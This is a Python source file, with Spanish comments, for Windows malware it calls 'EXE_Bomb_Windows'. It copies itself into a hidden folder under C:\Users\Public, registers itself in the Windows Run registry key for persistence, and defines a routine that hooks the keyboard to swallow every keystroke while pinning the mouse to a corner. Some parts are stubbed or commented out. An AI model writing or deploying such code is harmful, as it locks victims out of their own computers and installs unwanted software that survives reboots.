# v1.0
from pynput.mouse import Button, Controller  # Importa librería Mouse
import pythoncom, pyHook 
from winreg import *
import os 
from getpass import getuser 
from multiprocessing import Process
import threading
import shutil
      
def addStartup():  # function =  Iniciar automaticamente
    path = r"C:\\Users\\Public\\EXEBombWindows\\Virus\\NoMeBorres\\EXE_Bomb_Windows.exe"        # Path del Software completo
    name = "EXE_Bomb_Windows"                                                       # Nombre del StartUp
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'                       # Path del registro
    def verificar():    # Evita que se créen 2 veces el Bom
        try:  # Intenta crear la dirección
            os.makedirs('C:\\Users\\Public\\EXEBombWindows\\BoomRUN')
            return True # Se creó la carpeta
        except:
            return False# La carpeta ya existe
    try:    # Solo si tiene permisos de administrador
        registry = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS) # machine
        SetValueEx(registry,name, 0, REG_SZ, path)
        verificar() # Crea Carpeta
    except: # Si no tien permisos de administrador
        if (verificar()):
            registry = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS) # local
            SetValueEx(registry,name, 0, REG_SZ, path)
                      
def Block():            # Lib [KeyandMouse_Block]
    mouse = Controller()  
    def BlockMouse():
        mouse.position = (0, 0) # el mouse se va a la posición 0,0 de la pantalla
        #mouse.press(Button.right)
        #mouse.release(Button.right)
        mouse.press(Button.left)
        mouse.release(Button.left)
        
    k = pyHook.HookManager()
    while(True):
        def e(event):
            return False
        BlockMouse()                # Bloquea el mouse
        k.KeyAll = e
        k.HookKeyboard()
        pythoncom.PumpMessages()    # Bloquea Teclado
def CreateFileMain():   #
        try:  # Intenta crear la dirección 
            os.makedirs('C:\\Users\\Public\\EXEBombWindows\\Virus\\NoMeBorres')
            return True
        except:
            return False
        pass

        
        
def saturar():
    pass


    
    
    # si crear directorio es true , entonces cerrar, 
    # si crear directorio es false
    # continuar
    return False



if __name__ == '__main__':
    if (CreateFileMain()):  # Primer inicio
        nameKey = "EXE_Bomb_Windows.exe"
        filePath = "C:\\Users\\Public\\EXEBombWindows\\Virus\\NoMeBorres\\"+ nameKey 
        try:     
            with open(filePath, 'r') as f:      # Verifica si el keylogger se encuentra oculto en el sistema
                print("El virus existe")
        except : #Replica 
            print("No se encuentra en la carpeta, replicando...")
            try:
                shutil.copy(nameKey , filePath) # Intenta ocultar el keylogger en una carpeta
                print("Se replicó exitosamente")
            except:
                print("Replica fallida")
        # Autoinicia en registro
        addStartup()
        print("se creó la carpeta y startup exitoso, virus deshabilitado")
        exit()
    else:                   # Segundo inicio
        #block= threading.Thread(target=Block)   # Bloquea Teclado y mouse
        #block.start()
                   
        
        
        
        
        
        
        #h1= threading.Thread(target=ReplicateFile)   # C
        #h1.start()
        #h1.join()
        """
        p1 = Process(target=a)     #  Inicia automaticamente
        p2 = Process(target=B)          # 
        p2.start()
        p1.start()
        """
        
        #p1.join()
        #p2.join()
        print("la carpeta ya existe, virus en acción")
        pass
